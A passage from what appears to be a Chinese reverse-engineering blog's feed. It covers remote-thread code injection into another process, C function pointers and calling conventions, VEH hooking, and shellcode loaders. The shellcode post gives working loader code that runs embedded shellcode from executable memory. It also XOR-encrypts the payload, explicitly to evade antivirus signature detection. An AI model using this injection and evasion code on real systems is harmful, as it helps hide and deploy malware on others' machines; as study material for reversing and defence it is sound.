VirtualAllocEx(hProcess,NULL,dwSize,MEM_COMMIT,PAGE_READWRITE)))        {        printf("VirtualAllocEx() fail : err_code = %d\n", GetLastError());        return FALSE;    }    //写入线程信息块中函数的值和参数到进程中    if (!WriteProcessMemory(hProcess,pRemoteBuf[0],(LPVOID)&amp;param,dwSize,NULL))    {        printf("WriteProcessMemory() fail : err_code = %d\n", GetLastError());        return FALSE;    }    //再次开辟      dwSize = (DWORD)InjectCode - (DWORD)ThreadProc;    if (!(pRemoteBuf[1] = VirtualAllocEx(hProcess,NULL,dwSize,MEM_COMMIT,PAGE_EXECUTE_READWRITE)))    {        printf("VirtualAllocEx() fail : err_code = %d\n", GetLastError());        return FALSE;    }    //函数调用    if (!WriteProcessMemory(hProcess,pRemoteBuf[1],(LPVOID)ThreadProc,dwSize,NULL))    {        printf("WriteProcessMemory() fail : err_code = %d\n", GetLastError());        return FALSE;    }    //开启远程线程，LPTHREAD_START_ROUTINE指向一个回调函数，pRemoteBuf[1]是函数，pRemoteBufe[0]是函数的值和参数    if (!(hThread = CreateRemoteThread(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)pRemoteBuf[1],pRemoteBuf[0],0,NULL)))    {        printf("CreateRemoteThread() fail : err_code = %d\n", GetLastError());        return FALSE;    }    WaitForSingleObject(hThread, INFINITE);    CloseHandle(hThread);    CloseHandle(hProcess);    return TRUE;}BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege){    TOKEN_PRIVILEGES tp;    HANDLE hToken;    LUID luid;    if (!OpenProcessToken(GetCurrentProcess(),        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,        &amp;hToken))    {        printf("OpenProcessToken error: %u\n", GetLastError());        return FALSE;    }    if (!LookupPrivilegeValue(NULL,           // lookup privilege on local system          lpszPrivilege,  // privilege to lookup           &amp;luid))        // receives LUID of privilege      {        printf("LookupPrivilegeValue error: %u\n", GetLastError());        return FALSE;    }    tp.PrivilegeCount = 1;    tp.Privileges[0].Luid = luid;    if (bEnablePrivilege)        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;    else        tp.Privileges[0].Attributes = 0;    // Enable the privilege or disable all privileges.      if (!AdjustTokenPrivileges(hToken,        FALSE,        &amp;tp,        sizeof(TOKEN_PRIVILEGES),        (PTOKEN_PRIVILEGES)NULL,        (PDWORD)NULL))    {        printf("AdjustTokenPrivileges error: %u\n", GetLastError());        return FALSE;    }    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)    {        printf("The token does not have the specified privilege. \n");        return FALSE;    }    return TRUE;}int main(int argc, char* argv[]){    DWORD dwPID = 0;    if (argc != 2)    {        printf("\n USAGE  : %s &lt;pid&gt;\n", argv[0]);        return 1;    }    //进程提权    if (!SetPrivilege(SE_DEBUG_NAME, TRUE))        return 1;    //code injection      dwPID = (DWORD)atol(argv[1]);    dwPID = 9432;    InjectCode(dwPID);    return 0;}</code></pre><h1 id="0x03-最终效果"><a href="#0x03-最终效果" class="headerlink" title="0x03-最终效果"></a>0x03-最终效果</h1><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649916449939.png"></p><h1 id="0x04-代码注入调试练习"><a href="#0x04-代码注入调试练习" class="headerlink" title="0x04-代码注入调试练习"></a>0x04-代码注入调试练习</h1><p>先使用OD打开notepad++，并F9直至notepad++处于运行状态</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922555004.png" alt="进行设置"></p><p>然后查看notepad++ PID并注入</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922580481.png"></p><p>注入之后会断在ThreadProc函数</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922621425.png"></p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649922671867.png"></p><p>在x32中</p><p><img src="/2022/04/12/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/1649923028194.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00-前言&quot;&gt;&lt;/a&gt;0x00-前言&lt;/h1&gt;&lt;p&gt;感觉《逆向工程核心原理》只是进行了一点介绍，但是我理解能力有限&lt;/p&gt;
&lt;p&gt;于是翻阅到了这篇文章&lt;</summary>
      
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>基础知识补充</title>
    <link href="https://gift1a.github.io/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/"/>
    <id>https://gift1a.github.io/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/</id>
    <published>2022-04-11T07:59:14.000Z</published>
    <updated>2022-04-15T08:13:55.303Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-typedef定义函数指针"><a href="#0x00-typedef定义函数指针" class="headerlink" title="0x00-typedef定义函数指针"></a>0x00-typedef定义函数指针</h1><h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>在此之前我们要先了解函数指针，即存放函数首地址的变量，而函数名就是函数的首地址，为了存放函数的首地址就需要定义函数指针</p><pre class="language-c" data-language="c"><code class="language-c">void hello(){printf("this is hello!");}//函数指针定义void (*fp)()=hello;//函数指针定义时应保证函数返回值与参数个数、类型相同，在这里void是返回类型，(*fp)后面的()是函数参数/*也可以理解为void (*fp)();fp=hello;*///通过函数指针调用函数fp();int add(int a,int b){    return a+b;}//函数指针定义,形参可以不写变量名int (*fp1)(int,int)=add;//函数调用fp1(1,2);</code></pre><h2 id="typedef与函数指针混合使用"><a href="#typedef与函数指针混合使用" class="headerlink" title="typedef与函数指针混合使用"></a>typedef与函数指针混合使用</h2><pre class="language-c" data-language="c"><code class="language-c">typedef int (*FP)(int,int);</code></pre><p>那么我们在赋值的时候就可以改成</p><pre class="language-c" data-language="c"><code class="language-c">FP fp1=add;//fp1就是返回值为int型，参数为两个int型的函数指针，FP表示函数指针的类型，通过类型名+变量名就可以定义函数指针fp1(1,2);</code></pre><h1 id="0x01-回调函数"><a href="#0x01-回调函数" class="headerlink" title="0x01-回调函数"></a>0x01-回调函数</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>如果函数的参数具有函数指针，那么这样的函数就被称为回调函数</p><p>函数指针就是当作接口使用的</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><pre class="language-c" data-language="c"><code class="language-c">//这里的call就是回调函数,这里传递函数指针和我们传入数组时使用函数指针是类似的，都是使用指针将首地址进行传递，而不是传整个函数void call(void(*fp)()){    fp();//这样调用的时候就不需要考虑函数指针的变量名，只要传递的函数是这样类型的即可在call函数中进行调用    return ;}//当然也可以使用typedef，让回调函数更简洁typedef void (*fp)();void call(fp){    fp();    return ;}void hello(){    printf("hello");}void show(){    printf("show");}//如果不使用回调函数，调用时需要hello();show();int main(){    call(show);    call(hello);//使用回调函数调用，这样只需要传入不同参数即可完成调用    return 0;}</code></pre><h1 id="0x02-复杂函数"><a href="#0x02-复杂函数" class="headerlink" title="0x02-复杂函数"></a>0x02-复杂函数</h1><p>定义复杂的回调函数</p><pre class="language-c" data-language="c"><code class="language-c">void *handle(void*arg){    printf("arg is %X\n",arg);    return arg;//返回值是void*}//我们要定义一个参数为函数指针，返回值为函数指针的回调函数//先来看参数，传入函数指针void* (*fp)(void *),另一个还要传入的是arg，这里定义为void*p//然后再定义一个以上面两个参数为函数参数，返回值是函数指针(这里是handle函数指针)的函数void *(*call(void *(fp)(void*),void*p))(void *)//在这里call是回调函数的变量名，void*是返回值，最后的(void*)是返回的函数指针的参数，call()里的两个是回调函数的参数{    fp(p);    return fp;}int main(){    int num=10;    void*(*fp)(void*)=call(handle,&amp;num);//使用对应类型的函数指针接收    return 0;}//为了方便理解，使用typedeftypedef void*(*FP)(void*);FP call(FP fp1,void*p){    fp1(p);    return fp;}</code></pre><h1 id="0x03-一维数组内存"><a href="#0x03-一维数组内存" class="headerlink" title="0x03-一维数组内存"></a>0x03-一维数组内存</h1><pre class="language-c" data-language="c"><code class="language-c">int arr[6]={10,20,30,40};//当有初始值时，剩余没定义的默认为0，如果没有定义初始值，则为随机值</code></pre><p>因为数组长度定义为6，类型为int，所以在内存中分配24个字节</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649861619368.png" alt="数组在栈中的存储"></p><h1 id="0x04-函数声明"><a href="#0x04-函数声明" class="headerlink" title="0x04-函数声明"></a>0x04-函数声明</h1><p>返回值+函数名+参数</p><pre class="language-c" data-language="c"><code class="language-c">//函数声明int sum(int,int);int sum(int a,int b){return a+b;}</code></pre><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649862553289.png" alt="原因"></p><h1 id="0x05-调用约定"><a href="#0x05-调用约定" class="headerlink" title="0x05-调用约定"></a>0x05-调用约定</h1><p>为什么要有不同的调用约定——是因为调用函数之后需要清理栈，而不同的调用约定对应不同的清理方式</p><blockquote><p>__cdecl：调用者自己清理栈</p><pre class="language-c" data-language="c"><code class="language-c">//函数外部call hello;函数add esp,立即数</code></pre><p>__stdcall：函数自己清理栈</p><pre class="language-c" data-language="c"><code class="language-c">//函数内部retn 立即数</code></pre></blockquote><p>如果使用__cdcel调用方式，因为不同编译器产生的栈不同，所以不能很好地清理栈，而stdcall则可以在函数内部完成清理栈。</p><blockquote><p> <strong>所以，在跨（开发）平台的调用中，我们都使用stdcall（有时是以WINAPI的样子出现）。那么为什么还需要_cdecl呢？当我们遇到这样的函数如fprintf()它的参数是可变的，不定长的，被调用者事先无法知道参数的长度，事后的清除工作也无法正常的进行，因此，这种情况我们只能使用cdecl</strong> </p></blockquote><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898026998.png"></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898651751.png"></p><h1 id="0x06-extern-“C”"><a href="#0x06-extern-“C”" class="headerlink" title="0x06-extern “C”"></a>0x06-extern “C”</h1><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898161708.png"></p><p>也就是说如果不声明为extern “C”，我们导出的函数名会被修饰</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898480365.png" alt="DLL代码"></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898496934.png" alt="导出的函数名称"></p><p>可以看到我们的函数名被修饰了，在调用的时候我们无法通过GetProcAddress通过函数名调用</p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898566926.png" alt="代码"></p><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1649898581787.png" alt="导出的函数名称"></p><p>可以看到我们的函数名没有被修饰</p><blockquote><p><strong>C++函数重载即函数名可以相等，只要该函数的参数类型或者个数不同即可</strong></p></blockquote><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>标准文件头</p><pre class="language-c" data-language="c"><code class="language-c">#ifndef __INCvxWorksh  /*防止该头文件被重复引用*/#define __INCvxWorksh#ifdef __cplusplus    //__cplusplus是cpp中自定义的一个宏extern "C" {          //告诉编译器，这部分代码按C语言的格式进行编译，而不是C++的#endif    /**** some declaration or so *****/  #ifdef __cplusplus}#endif#endif /* __INCvxWorksh */</code></pre><blockquote><p> extern是C/C++语言中表明函数和全局变量作用范围（可见性）的关键字，该关键字告诉编译器，其声明的函数和变量可以在本模块或其它模块中使用 </p></blockquote><h1 id="0x07-HMOUDLE、HANDLE、HWND、HINSTANCE"><a href="#0x07-HMOUDLE、HANDLE、HWND、HINSTANCE" class="headerlink" title="0x07-HMOUDLE、HANDLE、HWND、HINSTANCE"></a>0x07-HMOUDLE、HANDLE、HWND、HINSTANCE</h1><p>这里就不看定义了，越看越晕（</p><h2 id="HWND"><a href="#HWND" class="headerlink" title="HWND"></a>HWND</h2><p>HWND是线程相关的，可以通过HWND找到该窗口所属进程的句柄</p><h2 id="HANDLE"><a href="#HANDLE" class="headerlink" title="HANDLE"></a>HANDLE</h2><p>Handle是代表系统的内核对象，如文件句柄，线程句柄，进程句柄</p><blockquote><p><strong>系统对内核对象以链表的形式进行管理，载入到内存中的内核对象都有一个线性地址，同时相对系统来说，在串列中有一个索引位置，这个索引位置就是内核对象的HANDLE</strong></p></blockquote><h2 id="HINSTANCE"><a href="#HINSTANCE" class="headerlink" title="HINSTANCE"></a>HINSTANCE</h2><p>HINSTANCE的本质是模块基地址，它仅在同一进程中才有意义，跨进程的HINSTANCE是没有意义的</p><h2 id="HMODULE"><a href="#HMODULE" class="headerlink" title="HMODULE"></a>HMODULE</h2><blockquote><p><strong>代表应用程序载入的模块，WIN32系统下通常是被载入模块的线性地址，比如exe, dll等模块等</strong></p></blockquote><blockquote><p> HINSTANCE 在win32下与HMODULE是相同的东西(只有在16位windows上，二者有所不同) </p></blockquote><h1 id="0x08-命令行参数"><a href="#0x08-命令行参数" class="headerlink" title="0x08-命令行参数"></a>0x08-命令行参数</h1><p>我们知道main函数实际上是有两个参数的，但一般不会进行使用</p><p>其原型如下</p><pre class="language-c" data-language="c"><code class="language-c">main(int argc,char*argv[])</code></pre><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650008765976.png"></p><p>这两个参数实际上与命令行相关</p><pre class="language-c" data-language="c"><code class="language-c">//argc是一个整数，其代表了命令行参数个数//argv是一个指针数组，可以接收多个参数，第一个也就是argv[0]指向输入的程序路径及名称//如果在命令行中运行，argc为1，也就是只有一个参数</code></pre><p><img src="/2022/04/11/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E8%A1%A5%E5%85%85/1650008701868.png"></p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(int argc,char *argv[]){printf("命令行参数个数为：%d\n", argc);for (int i = 0; i &lt; argc; ++i){printf("第%d个命令行参数为：%s\n", i, argv[i]);}return 0;}</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-typedef定义函数指针&quot;&gt;&lt;a href=&quot;#0x00-typedef定义函数指针&quot; class=&quot;headerlink&quot; title=&quot;0x00-typedef定义函数指针&quot;&gt;&lt;/a&gt;0x00-typedef定义函数指针&lt;/h1&gt;&lt;h2 id=&quot;函</summary>
      
    
    
    
    
    <category term="C" scheme="https://gift1a.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>VEH</title>
    <link href="https://gift1a.github.io/2022/04/10/VEH/"/>
    <id>https://gift1a.github.io/2022/04/10/VEH/</id>
    <published>2022-04-10T09:23:53.000Z</published>
    <updated>2022-04-11T03:07:09.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-VEH"><a href="#0x00-VEH" class="headerlink" title="0x00-VEH"></a>0x00-VEH</h1><p>VEH的中文名字为：向量化异常处理 （Vectored Exception Handling） ，是为操作系统提供的异常处理机制，类似于SEH，VEH的优先级高于SEH</p><p> <img src="/2022/04/10/VEH/592902_92wf161s7cgif01.png" alt="应用层异常处理结构图"> </p><h1 id="0x01-VEH回调函数详解"><a href="#0x01-VEH回调函数详解" class="headerlink" title="0x01-VEH回调函数详解"></a>0x01-VEH回调函数详解</h1><blockquote><p>VEH由AddVectorExceptionHandler添加处理函数，处理函数有一个参数</p><p>参数类型为PEXCEPTION_POINTERS结构体</p><p>结构PEXCEPTION_POINTERS保存着当前异常的各个寄存器，堆栈，地址等多种信息</p></blockquote><p> <img src="/2022/04/10/VEH/592902_cvh37cwxtybvmyq.png" alt="pEXCEPTION_POINTER"> </p><h1 id="0x02-VEH-Hook原理"><a href="#0x02-VEH-Hook原理" class="headerlink" title="0x02-VEH Hook原理"></a>0x02-VEH Hook原理</h1><blockquote><p>1、异常处理结构中，VEH是唯一一个可以接收到所有异常信息的处理。换句话说：所有的异常信息都会经过VEH</p><p>2、异常信息通常是由数组越界、内存访问出错、无效参数、int 3等造成的</p><p>3、一旦发生异常，操作系统会立即遍历VEH，如果有处理函数，中断线程，并由处理函数处理</p></blockquote><p>思路</p><p>如果我们要Hook消息框，首先要给API的首地址写入int 3断点，当执行时会产生异常，线程暂停，转交给异常处理函数处理，此时我们可以在处理函数中修改堆栈参数等</p><p>相应操作完成后将int 3(0xCC)修改回源代码 修改EIP=addr(异常地址)，然后让此处的代码重新执行一次正确的代码</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;Windows.h&gt;#include&lt;stdio.h&gt;#pragma data_seg("ldata")char trapcode[] = "*";unsigned long long llcode = 204;//CC 00 00 00INT3#pragma data_seg()#pragma comment(linker,"/SECTION:ldata,RWE")void Decshellcode(){llcode = 0xF333333333333333;llcode &lt;&lt;= 2;char* data = (char*)&amp;llcode;/** 解密shellcode 并且执行* len 解密后的指令长度* data 把解密后的指令写入data* 比如 push ebp 就向data写入0x55* 每次解密一条指令 不要用超过7字节的指令和跳转指令*/MessageBoxA(0, "不要再打辣", "停下", MB_OK);return ;}long _stdcall ExceptionHandle(PEXCEPTION_POINTERS val){//判断是否为int3断点if (val-&gt;ExceptionRecord-&gt;ExceptionCode == STATUS_BREAKPOINT){Decshellcode();//执行shellcode//修改EIPval-&gt;ContextRecord-&gt;Eip = (DWORD)&amp;llcode;//表示成功处理，让程序继续执行return EXCEPTION_CONTINUE_EXECUTION;}//继续往下搜索异常处理函数elsereturn EXCEPTION_CONTINUE_SEARCH;}#pragma optimize("",off)int main(){//创建VEH，当第一个参数不为0，则异常处理函数是第一个要调用的处理程序。如果参数为0，则处理程序是要调用的最后一个处理程序//第二个参数是一个异常处理函数AddVectoredExceptionHandler(1, ExceptionHandle);int bilibili = 2020;int arr[2] = { 1,2 };int ti = 23;arr[5] = (int)&amp;llcode;return 0;}#pragma optimize("",on)</code></pre><p><img src="/2022/04/10/VEH/1649639633494.png"></p><p>这里修改EIP为我们的Print()函数，因为函数名表示的就是函数地址，所以就是让他执行我们的Print函数</p><h1 id="0x03-VEH实现隐藏函数调用"><a href="#0x03-VEH实现隐藏函数调用" class="headerlink" title="0x03-VEH实现隐藏函数调用"></a>0x03-VEH实现隐藏函数调用</h1><p>我们知道函数调用时，会先把call的地址压入栈中，而在函数内部的返回ret指令就是从栈中取出call指令的下一条地址</p><p>所以我们可以对栈中的地址进行修改让其调用我们的函数</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;Windows.h&gt;#include&lt;stdio.h&gt;void showflag(){MessageBoxA(0, "this is flag", "flag", MB_OK);return ;}long _stdcall ExceptionHandler(PEXCEPTION_POINTERS val){//将EIP也就是下一条执行的指令修改为retval-&gt;ContextRecord-&gt;Eip += 6;//降低栈顶val-&gt;ContextRecord-&gt;Esp -= 4;//入栈,将ret下一条指令压入栈中*(int*)val-&gt;ContextRecord-&gt;Esp = val-&gt;ContextRecord-&gt;Eip + 1;//和上面一样，这次修改为我们想要执行的地址val-&gt;ContextRecord-&gt;Esp -= 4;*(int*)val-&gt;ContextRecord-&gt;Esp=*(int*)(val-&gt;ContextRecord-&gt;Ebp-8);return EXCEPTION_CONTINUE_EXECUTION;}int main(){AddVectoredExceptionHandler(1, ExceptionHandler);DWORD a = (DWORD)showflag;int k = 0;int c;c=a / k;//构造除0异常__asm{ret}printf("Get flag!!!");return 0;}</code></pre><p>具体的可以先看汇编</p><p><img src="/2022/04/10/VEH/1649645606291.png"></p><p>触发除零异常后，PEXCEPTION_POINTERS val会接收此时的信息</p><p>我们先将EIP修改为ret指令，然后将ret下一条指令压入栈中，再把我们要调用的函数压入栈，这时候栈的结构为</p><p><img src="/2022/04/10/VEH/1649645936725.png"></p><p>返回值为EXCEPTION_CONTINUE_EXECUTION，表示继续往下执行，这时候EIP是ret指令，取出栈顶元素，跳转过去，执行完我们的shellcode后也存在ret，此时的栈为</p><p><img src="/2022/04/10/VEH/1649646048618.png"></p><p>shellcode尾部的ret取出栈顶的值，跳转过去，回到我们正常的程序</p><blockquote><p>修改EIP的时候也可以</p><pre class="language-none"><code class="language-none">val-&gt;ContextRecord-&gt;Eip = (DWORD)val-&gt;ExceptionRecord-&gt;ExceptionAddress+6;</code></pre><p>ExceptionRecord-&gt;ExceptionAddress是触发异常的地址</p><p>ExceptionRecord-&gt;ExceptionCode表示异常的类型</p></blockquote><p>异常类型</p><p><img src="/2022/04/10/VEH/1649646418174.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-VEH&quot;&gt;&lt;a href=&quot;#0x00-VEH&quot; class=&quot;headerlink&quot; title=&quot;0x00-VEH&quot;&gt;&lt;/a&gt;0x00-VEH&lt;/h1&gt;&lt;p&gt;VEH的中文名字为：向量化异常处理 （Vectored Exception Handling</summary>
      
    
    
    
    
    <category term="Windows" scheme="https://gift1a.github.io/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>shellcode知识</title>
    <link href="https://gift1a.github.io/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/"/>
    <id>https://gift1a.github.io/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/</id>
    <published>2022-04-10T01:12:25.000Z</published>
    <updated>2022-04-14T07:28:03.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-Shellcode"><a href="#0x00-Shellcode" class="headerlink" title="0x00-Shellcode"></a>0x00-Shellcode</h1><p>什么是shellcode</p><blockquote><p> 在计算机安全中，shellcode是一小段代码，可以用于软件漏洞利用的载荷。被称为“shellcode”是因为它通常启动一个命令终端，攻击者可以通过这个终端控制受害的计算机，但是所有执行类似任务的代码片段都可以称作shellcode。Shellcode通常是以机器码形式编写的，所以我们要学习硬编码 </p></blockquote><h1 id="0x01-杀毒软件甄别病毒的技术原理"><a href="#0x01-杀毒软件甄别病毒的技术原理" class="headerlink" title="0x01-杀毒软件甄别病毒的技术原理"></a>0x01-杀毒软件甄别病毒的技术原理</h1><h2 id="基于特征进行甄别"><a href="#基于特征进行甄别" class="headerlink" title="基于特征进行甄别"></a>基于特征进行甄别</h2><p>主要是病毒以前留下的信息，基于这些信息，我们可以判断存在病毒。</p><p>我们知道在PE文件中的.text段存放的是可执行代码，而杀毒软件会将其内容读取出来，并进行程序特征提取，判断可执行代码中是否存在病毒的特征，有的话就确定该程序存在病毒。</p><p>这也就是为什么病毒还未运行就被发现的原因。</p><h2 id="基于病毒的行为进行甄别"><a href="#基于病毒的行为进行甄别" class="headerlink" title="基于病毒的行为进行甄别"></a>基于病毒的行为进行甄别</h2><p>主要是针对病毒行为的敏感操作，当病毒想干坏事的时候，难免会调用API，当出现比较敏感的操作时，确定该程序为病毒。</p><h1 id="0x03-一个简单的Loader"><a href="#0x03-一个简单的Loader" class="headerlink" title="0x03-一个简单的Loader"></a>0x03-一个简单的Loader</h1><pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;#include&lt;stdio.h&gt;unsigned char  shellcode[] ="\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C""\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53""\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B""\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75""\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD""\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE""\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24""\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03""\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9""\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61""\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";int main(){//分配内存，并设置为可读可写可执行，大小为shellcode的大小LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);if (Memory == NULL)//当开辟失败时，直接结束{return 1;}//将shellcode复制到内存中memcpy(Memory, shellcode, sizeof(shellcode));/*DWORD dold;VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, NULL);*///强制转换为函数((void(*)())Memory)();return 0;}</code></pre><p>运行时会直接弹出消息框</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649555515604.png"></p><p>整个过程就是先开辟内存（注意要注意属性），然后将shellcode复制到内存中，再将我们复制的数据强制转换为函数并进行调用。这些行为和特征都是没有什么问题的，所以如果我们插入的是恶意代码，是可以绕过杀毒软件的。</p><h1 id="0x04-优化Loader"><a href="#0x04-优化Loader" class="headerlink" title="0x04-优化Loader"></a>0x04-优化Loader</h1><h2 id="内存分配优化"><a href="#内存分配优化" class="headerlink" title="内存分配优化"></a>内存分配优化</h2><p>因为数据本身就占有内存，所以不需要重新进行分配，直接使用即可</p><h2 id="改变属性"><a href="#改变属性" class="headerlink" title="改变属性"></a>改变属性</h2><p>因为数据存储于数据段中，而我们要让其可以执行，则需要改变其属性为可执行</p><blockquote><p>0xC000005报错表示内存访问的属性问题</p></blockquote><pre class="language-c" data-language="c"><code class="language-c">BOOL VirtualProtect(  [in]  LPVOID lpAddress,  [in]  SIZE_T dwSize,  [in]  DWORD  flNewProtect,  [out] PDWORD lpflOldProtect);</code></pre><p>第一个参数是地址起始位置</p><p>第二个参数是需要改变的内存大小</p><p>第三个参数是想要改变的属性</p><p>主要有</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/42dad68bad2c64271524c48a96f3822.png"></p><p>第四个参数</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649556346133.png"></p><p>所以我们要让他指向有效变量，而不能是NULL</p><h2 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h2><p>不知道为什么使用这种方法在VS会报错-无法强制转换</p><p><img src="/2022/04/10/shellcode%E7%9F%A5%E8%AF%86/1649556539202.png"></p><h1 id="0x05-更进一步"><a href="#0x05-更进一步" class="headerlink" title="0x05-更进一步"></a>0x05-更进一步</h1><p>因为上一步将内存的属性修改并执行，那么一定会审计我们的shellcode，如果shellcode存在恶意的行为，很快就会被辨别出来，所以我们要对其进行加密，使其无法被识别。当然要注意要进行解密操作。</p><pre class="language-c" data-language="c"><code class="language-c">#include&lt;windows.h&gt;#include&lt;stdio.h&gt;#pragma data_seg("vdata")unsigned char  shellcode[] ="\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C""\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53""\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B""\x49\x0C\x8B\x09\x8B\x09\x8B\x69\x18\xAD\x3D\x6A\x0A\x38\x1E\x75""\x05\x95\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD""\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE""\x06\x3A\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24""\x1C\x75\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03""\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9""\x33\xDB\x53\x68\x74\x20\x00\x00\x68\x69\x6b\x61\x73\x68\x53\x61""\x6e\x64\x8B\xC4\x53\x50\x50\x53\xFF\x57\xFC\x8B\xE6\xC3";#pragma data_seg()//创建段，名称为vdata#pragma comment(linker,"/SECTION:vdata,RWE")//修改段的属性int main(){//加密函数for (int i = 0; i &lt; sizeof(shellcode); ++i){shellcode[i] ^= 0x23;}//分配内存，并设置为可读可写可执行，大小为shellcode的大小LPVOID Memory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);if (Memory == NULL)//当开辟失败时，直接结束{return 1;}//将shellcode复制到内存中memcpy(Memory, shellcode, sizeof(shellcode));//解密函数for (int i = 0; i &lt; sizeof(shellcode); ++i){*((char*)Memory + i) ^= 0x23;}////DWORD dold;////VirtualProtect(shellcode, sizeof(shellcode), PAGE_EXECUTE_READWRITE, 